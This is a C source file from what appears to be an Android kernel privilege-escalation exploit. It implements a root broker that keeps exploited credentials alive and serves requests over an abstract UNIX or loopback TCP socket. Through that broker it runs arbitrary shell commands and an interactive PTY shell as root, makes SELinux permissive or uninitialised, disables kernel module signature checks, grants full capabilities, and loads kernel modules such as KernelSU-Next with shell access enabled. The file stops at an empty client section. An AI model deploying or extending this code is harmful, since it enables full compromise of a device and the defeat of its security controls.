/* su.c - minimal su/broker channel (mrx-w09 port).
 *
 * After --escalate the process is uid 0 with init_cred's caps, but exec'ing a
 * new program drops the elevated creds on the device and SELinux may deny
 * mounts.  The mrx-w09 design keeps a *server* alive inside the exploited
 * process and lets a thin client hand it work over an abstract UNIX socket:
 *
 *   gl_su  (abstract, no filesystem entry)
 *     STATUS                -> uid/euid/gid/egid + caps + SELinux context
 *     GLCAP                 -> caps line only
 *     GLMOUNT|src|tgt|fstype|flags_hex|data   (src "-" means NULL)
 *     GLUMOUNT|tgt|flags
 *     <anything else>       -> /system/bin/sh -c <line> (server side)
 *
 * The server runs in the escalated process, so mounts and shells it spawns
 * inherit uid 0 / the cred it holds.  The client side (--rsh CMD) is
 * unprivileged: it only talks to the socket.
 *
 * QEMU note: the initramfs has no shell, so --su-selftest only exercises
 * STATUS/GLMOUNT/GLUMOUNT (the parts that prove the root creds survive the
 * fork + socket round trip).
 */
#include "common.h"

#include <stddef.h>
#include <linux/capability.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <termios.h>

#define GL_SU_SOCK "gl_su"

/* ------------------------------------------------------------------ */
/* abstract socket plumbing                                            */

static const char *su_socket_name(void) {
  return (g_opts.socket_name && g_opts.socket_name[0])
             ? g_opts.socket_name
             : GL_SU_SOCK;
}

static void su_addr(struct sockaddr_un *addr) {
  memset(addr, 0, sizeof(*addr));
  addr->sun_family = AF_UNIX;
  addr->sun_path[0] = 0; /* abstract namespace */
  const char *name = su_socket_name();
  size_t name_length = strlen(name);
  if (name_length >= sizeof(addr->sun_path) - 1) {
    name_length = sizeof(addr->sun_path) - 2;
  }
  memcpy(addr->sun_path + 1, name, name_length);
}

static socklen_t su_addr_len(void) {
  return (socklen_t)(offsetof(struct sockaddr_un, sun_path) +
                     1 + strlen(su_socket_name()));
}

static int su_listen(void) {
  if (g_opts.tcp_port > 0) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
      pr_warning("su: tcp socket errno=%d\n", errno);
      return -1;
    }
    int reuse = 1;
    (void)setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons((uint16_t)g_opts.tcp_port);
    int bind_rc = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    int bind_errno = errno;
    int listen_rc = bind_rc == 0 ? listen(fd, 4) : -1;
    int listen_errno = errno;
    if (bind_rc != 0 || listen_rc != 0) {
      pr_warning("su: tcp bind=%d errno=%d listen=%d errno=%d\n", bind_rc,
                 bind_errno, listen_rc, listen_errno);
      close(fd);
      return -1;
    }
    return fd;
  }

  int fd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (fd < 0) {
    pr_warning("su: socket gl_su errno=%d\n", errno);
    return -1;
  }
  struct sockaddr_un addr;
  su_addr(&addr);
  int bind_rc = bind(fd, (struct sockaddr *)&addr, su_addr_len());
  int bind_errno = errno;
  int listen_rc = bind_rc == 0 ? listen(fd, 4) : -1;
  int listen_errno = errno;
  if (bind_rc != 0 || listen_rc != 0) {
    pr_warning("su: bind=%d errno=%d listen=%d errno=%d\n", bind_rc,
               bind_errno, listen_rc, listen_errno);
    close(fd);
    return -1;
  }
  return fd;
}

static int su_connect(void) {
  if (g_opts.tcp_port > 0) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
      return -1;
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons((uint16_t)g_opts.tcp_port);
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
      close(fd);
      return -1;
    }
    return fd;
  }

  int fd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (fd < 0) {
    return -1;
  }
  struct sockaddr_un addr;
  su_addr(&addr);
  if (connect(fd, (struct sockaddr *)&addr, su_addr_len()) != 0) {
    close(fd);
    return -1;
  }
  return fd;
}

/* ------------------------------------------------------------------ */
/* request handling (runs in the forked child, conn dup2'd to 0/1/2)   */

static uint64_t su_read_cap(const char *name) {
  FILE *f = fopen("/proc/self/status", "r");
  if (!f) {
    return 0;
  }
  char line[128];
  uint64_t v = 0;
  size_t nl = strlen(name);
  while (fgets(line, sizeof(line), f)) {
    if (!strncmp(line, name, nl)) {
      v = strtoull(line + nl, NULL, 16);
      break;
    }
  }
  fclose(f);
  return v;
}

static void su_print_status(void) {
  char ctx[128] = "?";
  read_first_line("/proc/self/attr/current", ctx, sizeof(ctx));
  uint64_t eff = su_read_cap("CapEff:");
  uint64_t prm = su_read_cap("CapPrm:");
  dprintf(1, "uid=%d euid=%d gid=%d egid=%d cap_eff=%016llx cap_prm=%016llx ctx=%s\n",
          (int)getuid(), (int)geteuid(), (int)getgid(), (int)getegid(),
          (unsigned long long)eff, (unsigned long long)prm, ctx);
}

static int su_parse_hex(const char *s, unsigned long *out) {
  char *end = NULL;
  unsigned long v = strtoul(s, &end, 16);
  if (end == s) {
    return 0;
  }
  *out = v;
  return 1;
}

/* GLMOUNT|src|tgt|fstype|flags_hex|data */
static void su_do_mount(char *args) {
  char *save = NULL;
  char *src = strtok_r(args, "|", &save);
  char *tgt = strtok_r(NULL, "|", &save);
  char *type = strtok_r(NULL, "|", &save);
  char *flags = strtok_r(NULL, "|", &save);
  char *data = strtok_r(NULL, "|", &save);
  unsigned long fl = 0;
  if (!tgt || !type || !flags || !su_parse_hex(flags, &fl)) {
    printf("rc=-1 errno=%d (bad GLMOUNT line)\n", EINVAL);
    return;
  }
  const char *s = (src && strcmp(src, "-") != 0) ? src : NULL;
  int rc = mount(s, tgt, type, fl, data && strcmp(data, "-") != 0 ? data : NULL);
  printf("rc=%d errno=%d\n", rc == 0 ? 0 : -1, rc == 0 ? 0 : errno);
}

/* GLUMOUNT|tgt|flags_hex */
static void su_do_umount(char *args) {
  char *save = NULL;
  char *tgt = strtok_r(args, "|", &save);
  char *flags = strtok_r(NULL, "|", &save);
  unsigned long fl = 0;
  if (!tgt || !flags || !su_parse_hex(flags, &fl)) {
    printf("rc=-1 errno=%d (bad GLUMOUNT line)\n", EINVAL);
    return;
  }
  int rc = umount2(tgt, (int)fl);
  printf("rc=%d errno=%d\n", rc == 0 ? 0 : -1, rc == 0 ? 0 : errno);
}

static void su_set_winsize(int fd, int rows, int cols) {
  if (rows <= 0) {
    rows = 24;
  }
  if (cols <= 0) {
    cols = 80;
  }
  struct winsize ws;
  memset(&ws, 0, sizeof(ws));
  ws.ws_row = (unsigned short)rows;
  ws.ws_col = (unsigned short)cols;
  (void)ioctl(fd, TIOCSWINSZ, &ws);
}

static int su_prepare_ambient_caps(void) {
  struct __user_cap_header_struct header = {
    .version = _LINUX_CAPABILITY_VERSION_3,
    .pid = 0,
  };
  struct __user_cap_data_struct caps[2] = {0};
  if (syscall(__NR_capget, &header, caps) != 0) {
    return 0;
  }

  uint64_t permitted =
      ((uint64_t)caps[1].permitted << 32) | caps[0].permitted;
  uint64_t valid_caps = 0;
  unsigned cap_last = 63;
  FILE *last_cap_file = fopen("/proc/sys/kernel/cap_last_cap", "r");
  if (last_cap_file) {
    unsigned parsed = 0;
    if (fscanf(last_cap_file, "%u", &parsed) == 1 && parsed < 64) {
      cap_last = parsed;
    }
    fclose(last_cap_file);
  }
  for (unsigned cap = 0; cap <= cap_last; cap++) {
    if (permitted & (1ULL << cap)) {
      valid_caps |= 1ULL << cap;
    }
  }

  caps[0].permitted = (uint32_t)valid_caps;
  caps[1].permitted = (uint32_t)(valid_caps >> 32);
  caps[0].effective = caps[0].permitted;
  caps[1].effective = caps[1].permitted;
  caps[0].inheritable = caps[0].permitted;
  caps[1].inheritable = caps[1].permitted;
  if (syscall(__NR_capset, &header, caps) != 0) {
    return 0;
  }

  for (unsigned cap = 0; cap <= cap_last; cap++) {
    if (valid_caps & (1ULL << cap)) {
      (void)prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE,
                  (unsigned long)cap, 0, 0);
    }
  }
  return 1;
}

static int su_relay_to(int dst, const char *buf, size_t len) {
  size_t off = 0;
  while (off < len) {
    ssize_t n = write(dst, buf + off, len - off);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    off += (size_t)n;
  }
  return 1;
}

/* The socket is full duplex, but it is not a terminal.  Allocate a PTY and
 * make the shell its session leader/controlling terminal so Ctrl-C, Ctrl-Z,
 * line editing, and foreground job control work normally. */
static int su_run_pty_shell(int rows, int cols) {
  int master = open("/dev/ptmx", O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master < 0) {
    dprintf(1, "pty: open /dev/ptmx errno=%d\n", errno);
    return 0;
  }
  if (grantpt(master) != 0 || unlockpt(master) != 0) {
    int e = errno;
    dprintf(1, "pty: grant/unlock errno=%d\n", e);
    close(master);
    return 0;
  }
  char slave_name[128];
  if (ptsname_r(master, slave_name, sizeof(slave_name)) != 0) {
    int e = errno;
    dprintf(1, "pty: ptsname errno=%d\n", e);
    close(master);
    return 0;
  }
  int slave = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave < 0) {
    int e = errno;
    dprintf(1, "pty: open %s errno=%d\n", slave_name, e);
    close(master);
    return 0;
  }
  su_set_winsize(master, rows, cols);

  pid_t child = fork();
  if (child == 0) {
    close(master);
    if (setsid() < 0) {
      _exit(127);
    }
    (void)ioctl(slave, TIOCSCTTY, 0);
    if (dup2(slave, 0) < 0 || dup2(slave, 1) < 0 || dup2(slave, 2) < 0) {
      _exit(127);
    }
    if (slave > 2) {
      close(slave);
    }
    const char *sh = (g_opts.shell_path && g_opts.shell_path[0])
                         ? g_opts.shell_path
                         : "/system/bin/sh";
    execl(sh, "sh", "-i", (char *)NULL);
    _exit(127);
  }
  close(slave);
  if (child < 0) {
    dprintf(1, "pty: fork errno=%d\n", errno);
    close(master);
    return 0;
  }

  char buf[4096];
  int sock_open = 1;
  for (;;) {
    struct pollfd pf[2] = {
      {.fd = 0, .events = POLLIN},
      {.fd = master, .events = POLLIN},
    };
    int rc = poll(pf, sock_open ? 2 : 1, -1);
    if (rc < 0) {
      if (errno == EINTR) {
        continue;
      }
      break;
    }
    if (sock_open && pf[0].revents & (POLLIN | POLLHUP | POLLERR)) {
      ssize_t n = read(0, buf, sizeof(buf));
      if (n > 0) {
        if (!su_relay_to(master, buf, (size_t)n)) {
          sock_open = 0;
        }
      } else {
        sock_open = 0;
      }
    }
    if (pf[1].revents & (POLLIN | POLLHUP | POLLERR)) {
      ssize_t n = read(master, buf, sizeof(buf));
      if (n > 0) {
        if (!su_relay_to(1, buf, (size_t)n)) {
          break;
        }
      } else if (n == 0 || errno == EIO) {
        break;
      }
    }
  }
  close(master);
  int status = 0;
  (void)waitpid(child, &status, WNOHANG);
  return 1;
}

static void su_handle(int cfd) {
  if (dup2(cfd, 0) < 0 || dup2(cfd, 1) < 0 || dup2(cfd, 2) < 0) {
    _exit(1);
  }
  if (cfd > 2) {
    close(cfd);
  }

  char line[4096];
  ssize_t n = read(0, line, sizeof(line) - 1);
  if (n <= 0) {
    _exit(1);
  }
  line[n] = 0;
  while (n > 0 && (line[n - 1] == '\n' || line[n - 1] == '\r')) {
    line[--n] = 0;
  }

  if (!strcmp(line, "STATUS")) {
    su_print_status();
    fflush(stdout);
    _exit(0);
  }
  if (!strcmp(line, "GLCAP")) {
    dprintf(1, "cap_eff=%016llx cap_prm=%016llx\n",
            (unsigned long long)su_read_cap("CapEff:"),
            (unsigned long long)su_read_cap("CapPrm:"));
    fflush(stdout);
    _exit(0);
  }
  if (!strcmp(line, "GLCAPGRANT")) {
    int ok = slide_grant_live_capabilities();
    dprintf(1, "capgrant=%d cap_eff=%016llx cap_prm=%016llx cap_bnd=%016llx\n",
            ok,
            (unsigned long long)su_read_cap("CapEff:"),
            (unsigned long long)su_read_cap("CapPrm:"),
            (unsigned long long)su_read_cap("CapBnd:"));
    fflush(stdout);
    _exit(ok ? 0 : 2);
  }
  if (!strcmp(line, "GLSELINUX")) {
    int ok = slide_run_selinux_relax();
    dprintf(1, "selinux_relax=%d\n", ok);
    fflush(stdout);
    _exit(ok ? 0 : 2);
  }
  if (!strcmp(line, "GLWAKEUEVENT")) {
    int uninit_ok = slide_run_selinux_uninit();
    int event_writes = 0;
    if (uninit_ok) {
      for (int attempt = 0; attempt < 400; attempt++) {
        int event_fd = open("/sys/class/input/input1/uevent",
                            O_WRONLY | O_CLOEXEC);
        if (event_fd < 0) {
          event_fd = open("/sys/class/input/input0/uevent",
                          O_WRONLY | O_CLOEXEC);
        }
        if (event_fd < 0) {
          break;
        }
        if (write(event_fd, "add", 3) == 3) {
          event_writes++;
        }
        close(event_fd);
      }
    }
    int restored = slide_restore_selinux_initialized();
    dprintf(1, "wake_uevent uninit=%d writes=%d restored=%d\n",
            uninit_ok, event_writes, restored);
    fflush(stdout);
    _exit(uninit_ok && restored && event_writes > 0 ? 0 : 2);
  }
  if (!strcmp(line, "GLHARDEN")) {
    int ok = slide_run_harden();
    dprintf(1, "harden=%d\n", ok);
    fflush(stdout);
    _exit(ok ? 0 : 2);
  }
  if (!strcmp(line, "GLPERMISSIVE")) {
    int ok = slide_run_selinux_permissive();
    dprintf(1, "selinux_permissive=%d\n", ok);
    fflush(stdout);
    _exit(ok ? 0 : 2);
  }
  if (!strcmp(line, "GLSIGPERM")) {
    int ok = slide_run_module_sig_disable();
    dprintf(1, "module_sig_disable=%d\n", ok);
    fflush(stdout);
    _exit(ok ? 0 : 2);
  }
  if (!strcmp(line, "GLMODREADY")) {
    int ok = slide_run_module_ready();
    dprintf(1, "module_ready=%d\n", ok);
    fflush(stdout);
    _exit(ok ? 0 : 2);
  }
  if (!strncmp(line, "GLEXECCAP|", 10)) {
    char *argv[16] = {0};
    int argc = 0;
    char *save = NULL;
    for (char *arg = strtok_r(line + 10, "|", &save);
         arg && argc < 15;
         arg = strtok_r(NULL, "|", &save)) {
      argv[argc++] = arg;
    }
    if (!argc || !su_prepare_ambient_caps()) {
      dprintf(1, "ambient_cap_setup_failed errno=%d\n", errno);
      _exit(2);
    }
    execv(argv[0], argv);
    dprintf(1, "execv_rc=-1 errno=%d path=%s\n", errno, argv[0]);
    _exit(2);
  }
  if (!strncmp(line, "GLLOADMOD|", 10)) {
    char *path = line + 10;
    char *flags_text = strrchr(path, '|');
    unsigned long flags = 0;
    if (flags_text) {
      *flags_text++ = 0;
      (void)su_parse_hex(flags_text, &flags);
    }
    errno = 0;
    int module_fd = open(path, O_RDONLY | O_CLOEXEC);
    if (module_fd < 0) {
      dprintf(1, "open_rc=-1 errno=%d path=%s\n", errno, path);
      _exit(2);
    }
    long load_rc =
        syscall(__NR_finit_module, module_fd, "", (unsigned int)flags);
    int load_errno = errno;
    close(module_fd);
    dprintf(1, "finit_module_rc=%ld errno=%d flags=%#lx path=%s\n",
            load_rc, load_errno, flags, path);
    _exit(load_rc == 0 ? 0 : 2);
  }
  if (!strncmp(line, "GLINITMODLATE|", 14)) {
    char *module_path = line + 14;
    char *manager_path = strchr(module_path, '|');
    if (!manager_path) {
      dprintf(1, "init_module_late: missing manager path\n");
      _exit(2);
    }
    *manager_path++ = 0;
    char *package_name = strchr(manager_path, '|');
    if (!package_name) {
      package_name = (char *)"com.rifsxd.ksunext";
    } else {
      *package_name++ = 0;
    }

    int module_fd = open(module_path, O_RDONLY | O_CLOEXEC);
    if (module_fd < 0) {
      dprintf(1, "init_module_late: open %s errno=%d\n",
              module_path, errno);
      _exit(2);
    }
    struct stat module_stat;
    if (fstat(module_fd, &module_stat) != 0 ||
        module_stat.st_size <= 0) {
      dprintf(1, "init_module_late: stat %s errno=%d\n",
              module_path, errno);
      close(module_fd);
      _exit(2);
    }
    size_t module_size = (size_t)module_stat.st_size;
    void *module_data = malloc(module_size);
    if (!module_data) {
      close(module_fd);
      _exit(2);
    }
    size_t module_used = 0;
    while (module_used < module_size) {
      ssize_t got = read(module_fd, (char *)module_data + module_used,
                         module_size - module_used);
      if (got <= 0) {
        dprintf(1, "init_module_late: read errno=%d\n", errno);
        free(module_data);
        close(module_fd);
        _exit(2);
      }
      module_used += (size_t)got;
    }
    close(module_fd);

    errno = 0;
    long load_rc =
        syscall(__NR_init_module, module_data, module_size, "allow_shell=1");
    int load_errno = errno;
    free(module_data);
    dprintf(1, "init_module_late rc=%ld errno=%d\n", load_rc, load_errno);
    if (load_rc != 0) {
      _exit(2);
    }

    execl(manager_path, "ksud", "late-load", "--allow-shell",
          "--package-name", package_name, (char *)NULL);
    dprintf(1, "init_module_late: exec %s errno=%d\n",
            manager_path, errno);
    _exit(2);
  }
  if (!strcmp(line, "GLKDOMAIN")) {
    int ok = slide_run_kernel_domain();
    dprintf(1, "kdomain=%d ", ok);
    su_print_status();
    fflush(stdout);
    if (ok) {
      /* The edited cred intentionally points at the static init security
       * blob.  Keep this process alive so exit_creds() cannot release that
       * shared pointer while the broker is still serving. */
      for (;;) {
        pause();
      }
    }
    _exit(2);
  }
  if (!strncmp(line, "GLTARGETDOMAIN|", 15)) {
    int target_pid = 0;
    char target_comm[32] = {0};
    if (sscanf(line + 15, "%d|%31s", &target_pid, target_comm) != 2 ||
        target_pid <= 0 || target_comm[0] == '\0') {
      dprintf(1, "target_domain=0 (bad request)\n");
      _exit(2);
    }
    int ok = slide_set_current_target_domain(target_pid, target_comm);
    dprintf(1, "target_domain=%d ", ok);
    su_print_status();
    fflush(stdout);
    _exit(ok ? 0 : 2);
  }
  if (!strcmp(line, "GLTARGETUEVENT")) {
    int ok = slide_run_target_uevent();
    dprintf(1, "target_uevent=%d ", ok);
    su_print_status();
    fflush(stdout);
    _exit(ok ? 0 : 2);
  }
  if (!strncmp(line, "GLSHELL", 7)) {
    int rows = 0;
    int cols = 0;
    (void)sscanf(line, "GLSHELL|%d|%d", &rows, &cols);
    (void)su_run_pty_shell(rows, cols);
    _exit(0);
  }
  if (!strncmp(line, "GLMOUNT|", 8)) {
    su_do_mount(line + 8);
    fflush(stdout);
    _exit(0);
  }
  if (!strncmp(line, "GLUMOUNT|", 9)) {
    su_do_umount(line + 9);
    fflush(stdout);
    _exit(0);
  }

  /* Anything else is a command for the server's shell. */
  const char *sh = (g_opts.shell_path && g_opts.shell_path[0])
                       ? g_opts.shell_path
                       : "/system/bin/sh";
  if (!su_prepare_ambient_caps()) {
    pr_warning("su: ambient capability setup failed errno=%d\n", errno);
  }
  execl(sh, "sh", "-c", line, (char *)NULL);
  printf("rc=-1 errno=%d (exec %s)\n", errno, sh);
  _exit(127);
}

/* ------------------------------------------------------------------ */
/* server loop                                                         */

static void su_reap(void) {
  while (waitpid(-1, NULL, WNOHANG) > 0) {
  }
}

static int su_serve(int lfd, int max_requests) {
  int served = 0;
  for (;;) {
    su_reap();
    if (max_requests > 0 && served >= max_requests) {
      return 1;
    }
    int c = accept(lfd, NULL, NULL);
    if (c < 0) {
      if (errno == EINTR) {
        continue;
      }
      pr_warning("su: accept errno=%d\n", errno);
      return 0;
    }
    served++;
    pid_t p = fork();
    if (p == 0) {
      close(lfd);
      su_handle(c);
      _exit(0);
    }
    close(c);
  }
}

int su_run_server(void) {
  /* The server is launched from an adb/shell session.  It must detach before
   * the credential writes; otherwise shell teardown can kill the process
   * group while detached write children remain alive. */
  (void)setsid();
  signal(SIGHUP, SIG_IGN);

  /*
   * Bind while the process is still in the shell domain.  A listener created
   * after the credential moves to u:r:kernel:s0 carries the kernel socket
   * label, which makes the ordinary shell client fail with EACCES.
   */
  int lfd = su_listen();
  if (lfd < 0) {
    pr_warning("su: listen failed; parking to avoid cred exit\n");
    for (;;) {
      pause();
    }
  }

  if (g_opts.module_prep && !slide_run_module_prep()) {
    pr_warning("su: module preparation failed\n");
    return 0;
  }

  int escalated = 0;
  if (g_opts.serve_only) {
    escalated = geteuid() == 0;
    if (!escalated) {
      pr_warning("su: --serve-only requires euid=0\n");
    }
  } else if (g_opts.cred_only) {
    g_opts.fire_and_forget = 1;
    escalated = slide_run_cred_only();
  } else {
    escalated = g_opts.simple_root ? slide_run_simple_root()
                                   : slide_run_escalate();
  }
  if (!escalated) {
    pr_warning("su: escalate incomplete; keeping process alive and trying "
               "broker anyway\n");
  }
  if (g_opts.serve_target_domain_pid > 0) {
    const char *target_comm =
        (g_opts.target_domain_comm && g_opts.target_domain_comm[0])
            ? g_opts.target_domain_comm
            : "init";
    if (!slide_set_current_target_domain(g_opts.serve_target_domain_pid,
                                         target_comm)) {
      pr_warning("su: serve target domain setup failed\n");
      return 0;
    }
    pr_success("su: serving with target domain pid=%d comm=%s\n",
               g_opts.serve_target_domain_pid, target_comm);
  }
  if (g_opts.kernel_shell) {
    const char *sh = (g_opts.shell_path && g_opts.shell_path[0])
                         ? g_opts.shell_path
                         : "/system/bin/sh";
    char ctx[128] = "?";
    read_first_line("/proc/self/attr/current", ctx, sizeof(ctx));
    dprintf(1, "kernel-shell: uid=%d euid=%d ctx=%s\n", (int)getuid(),
            (int)geteuid(), ctx);
    execl(sh, "sh", "-i", (char *)NULL);
    pr_warning("kernel-shell: exec %s errno=%d; parking\n", sh, errno);
    for (;;) {
      pause();
    }
  }
  if (g_opts.tcp_port > 0) {
    pr_success("su: uid=%d euid=%d serving on 127.0.0.1:%d (max=%d)%s\n",
               (int)getuid(), (int)geteuid(), g_opts.tcp_port,
               g_opts.serve_count, escalated ? "" : " [nonroot fallback]");
  } else {
    pr_success("su: uid=%d euid=%d serving on abstract @%s (max=%d)%s\n",
               (int)getuid(), (int)geteuid(), su_socket_name(),
               g_opts.serve_count, escalated ? "" : " [nonroot fallback]");
  }
  (void)su_serve(lfd, g_opts.serve_count);
  /* This process keeps the escalated cred; exiting it would run the futex
     exit walk over any stale overlay state, so park instead. */
  pr_info("su: parked (no exit walk)\n");
  for (;;) {
    pause();
  }
}

static int su_read_module_file(const char *path, void **buffer, size_t *size) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  struct stat module_stat;
  if (fstat(fd, &module_stat) != 0 || module_stat.st_size <= 0) {
    close(fd);
    return 0;
  }
  size_t length = (size_t)module_stat.st_size;
  void *data = malloc(length);
  if (!data) {
    close(fd);
    return 0;
  }
  size_t used = 0;
  while (used < length) {
    ssize_t got = read(fd, (char *)data + used, length - used);
    if (got <= 0) {
      free(data);
      close(fd);
      return 0;
    }
    used += (size_t)got;
  }
  close(fd);
  *buffer = data;
  *size = length;
  return 1;
}

static int su_ksu_module_present(void) {
  FILE *modules = fopen("/proc/modules", "r");
  if (!modules) {
    return 0;
  }
  char line[512];
  int present = 0;
  while (fgets(line, sizeof(line), modules)) {
    if (!strncmp(line, "ksu_next ", 9)) {
      present = 1;
      break;
    }
  }
  fclose(modules);
  return present;
}

static int su_avc_helper_loop(int request_fd, int response_fd) {
  for (;;) {
    char command = 0;
    ssize_t command_size = read(request_fd, &command, sizeof(command));
    if (command_size != (ssize_t)sizeof(command)) {
      return 0;
    }

    int result = 0;
    if (command == 'C' || command == 'S') {
      uint16_t tclass = command == 'C' ? SLIDE_SECCLASS_CAPABILITY
                                       : SLIDE_SECCLASS_SYSTEM;
      result = slide_avc_grant_module_permission(SLIDE_ADB_SHELL_SID,
                                                 tclass);
    } else if (command == 'Q') {
      return 1;
    }

    char response = result ? '1' : '0';
    if (write(response_fd, &response, sizeof(response)) !=
        (ssize_t)sizeof(response)) {
      return 0;
    }
  }
}

static int su_start_avc_helper(pid_t *helper_pid, int *request_fd,
                               int *response_fd) {
  int request_pipe[2] = {-1, -1};
  int response_pipe[2] = {-1, -1};
  if (pipe(request_pipe) != 0 || pipe(response_pipe) != 0) {
    return 0;
  }

  pid_t helper = fork();
  if (helper < 0) {
    close(request_pipe[0]);
    close(request_pipe[1]);
    close(response_pipe[0]);
    close(response_pipe[1]);
    return 0;
  }
  if (helper == 0) {
    close(request_pipe[1]);
    close(response_pipe[0]);
    int result =
        su_avc_helper_loop(request_pipe[0], response_pipe[1]);
    _exit(result ? 0 : 2);
  }

  close(request_pipe[0]);
  close(response_pipe[1]);
  *helper_pid = helper;
  *request_fd = request_pipe[1];
  *response_fd = response_pipe[0];
  return 1;
}

static int su_avc_helper_command(int request_fd, int response_fd,
                                 char command) {
  if (write(request_fd, &command, sizeof(command)) !=
      (ssize_t)sizeof(command)) {
    return 0;
  }
  char response = 0;
  if (read(response_fd, &response, sizeof(response)) !=
      (ssize_t)sizeof(response)) {
    return 0;
  }
  return response == '1';
}

static void su_stop_avc_helper(pid_t helper_pid, int request_fd,
                               int response_fd) {
  if (request_fd >= 0) {
    (void)su_avc_helper_command(request_fd, response_fd, 'Q');
    close(request_fd);
  }
  if (response_fd >= 0) {
    close(response_fd);
  }
  if (helper_pid > 0) {
    (void)waitpid(helper_pid, NULL, 0);
  }
}

static int su_run_ku_load_child(void) {
  int progress_fd = open("/data/local/tmp/ksu-load-result.log",
                         O_WRONLY | O_CREAT | O_TRUNC, 0666);
#define KSU_PROGRESS(message)                                                   \
  do {                                                                          \
    if (progress_fd >= 0) {                                                     \
      dprintf(progress_fd, "%s\n", message);                                   \
      fsync(progress_fd);                                                       \
    }                                                                           \
  } while (0)

  KSU_PROGRESS("child-start");
  if (!g_opts.ksu_module || !g_opts.ksu_manager) {
    pr_warning("ksu-load: module and manager paths are required\n");
    return 0;
  }
  int avc_ready = access("/dev/dfroot-ok", F_OK) == 0;
  KSU_PROGRESS(avc_ready ? "dirtyfrag-bootstrap-ready"
                         : "dirtyfrag-bootstrap-missing");
  if (!avc_ready) {
    (void)slide_run_harden();
    KSU_PROGRESS("harden-done");
    if (!slide_run_module_prep()) {
      pr_warning("ksu-load: module preparation failed\n");
      return 0;
    }
    KSU_PROGRESS("module-prep-done");
  }

  if (!slide_run_simple_root()) {
    pr_warning("ksu-load: root failed\n");
    return 0;
  }
  KSU_PROGRESS("simple-root-done");
  g_opts.no_cap_bounding = 1;
  if (!slide_grant_live_capabilities()) {
    pr_warning("ksu-load: capability setup failed\n");
    KSU_PROGRESS("capability-setup-failed");
    return 0;
  }
  if (progress_fd >= 0) {
    dprintf(progress_fd,
            "capability-values eff=%016llx prm=%016llx bnd=%016llx\n",
            (unsigned long long)su_read_cap("CapEff:"),
            (unsigned long long)su_read_cap("CapPrm:"),
            (unsigned long long)su_read_cap("CapBnd:"));
    fsync(progress_fd);
  }
  KSU_PROGRESS("capability-setup-done");

  if (!avc_ready) {
    if (!slide_set_current_init_user_ns()) {
      KSU_PROGRESS("user-ns-setup-failed");
      return 0;
    }
    KSU_PROGRESS("user-ns-setup-done");

    if (!slide_set_current_sid_zero()) {
      KSU_PROGRESS("current-sid-zero-failed");
      return 0;
    }
    KSU_PROGRESS("current-sid-zero-done");
  }

  int module_fd = open(g_opts.ksu_module, O_RDONLY | O_CLOEXEC);
  if (module_fd < 0) {
    pr_warning("ksu-load: cannot open %s errno=%d\n",
               g_opts.ksu_module, errno);
    return 0;
  }
  KSU_PROGRESS("module-read-done");

  if (!avc_ready) {
    if (!slide_run_selinux_uninit()) {
      KSU_PROGRESS("selinux-uninit-failed");
      close(module_fd);
      return 0;
    }
    KSU_PROGRESS("selinux-uninit-done");
  }

  errno = 0;
  long capability_probe =
      syscall(__NR_delete_module, "ghostlock_probe_missing", 0);
  int capability_probe_errno = errno;
  if (progress_fd >= 0) {
    dprintf(progress_fd, "delete-module-probe=%ld errno=%d\n",
            capability_probe, capability_probe_errno);
    fsync(progress_fd);
  }

  errno = 0;
  long result =
      syscall(__NR_finit_module, module_fd, "allow_shell=1", 0);
  int result_errno = errno;
  if (!avc_ready) {
    int state_restored = slide_restore_selinux_initialized();
    KSU_PROGRESS(state_restored ? "selinux-initialized-restored"
                                : "selinux-initialized-restore-failed");
  }
  close(module_fd);
  if (progress_fd >= 0) {
    dprintf(progress_fd, "init-module-seed=%ld errno=%d\n",
            result, result_errno);
    fsync(progress_fd);
  }
  if (result != 0) {
    pr_warning("ksu-load: init_module failed errno=%d\n", result_errno);
    if (progress_fd >= 0) {
      close(progress_fd);
    }
    return 0;
  }
  pr_success("ksu-load: module installed, starting late-load\n");

  const char *package = (g_opts.ksu_package && g_opts.ksu_package[0])
                            ? g_opts.ksu_package
                            : "com.rifsxd.ksunext";
  char context[128] = "?";
  read_first_line("/proc/self/attr/current", context, sizeof(context));
  if (progress_fd >= 0) {
    dprintf(progress_fd, "module-context=%s\n", context);
    fsync(progress_fd);
    close(progress_fd);
  }
  if (!su_prepare_ambient_caps()) {
    pr_warning("ksu-load: ambient capability setup failed errno=%d\n", errno);
  }
  execl(g_opts.ksu_manager, "ksud", "late-load", "--allow-shell",
        "--kmi", "android12-5.4", "--package-name", package, (char *)NULL);
  pr_warning("ksu-load: exec %s errno=%d\n", g_opts.ksu_manager, errno);
  return 0;
#undef KSU_PROGRESS
}

int su_run_ksu_load(void) {
  pid_t child = fork();
  if (child == 0) {
    int result = su_run_ku_load_child();
    _exit(result ? 0 : 2);
  }
  if (child < 0) {
    pr_warning("ksu-load: fork failed errno=%d\n", errno);
    return 0;
  }

  for (int attempt = 0; attempt < 120; attempt++) {
    if (su_ksu_module_present()) {
      pr_success("ksu-load: ksu_next module is live\n");
      return 1;
    }
    int status = 0;
    pid_t waited = waitpid(child, &status, WNOHANG);
    if (waited == child) {
      break;
    }
    sleep(1);
  }
  (void)waitpid(child, NULL, WNOHANG);
  pr_warning("ksu-load: child did not make ksu_next live\n");
  return 0;
}

/* ------------------------------------------------------------------ */
/* client                                                              */

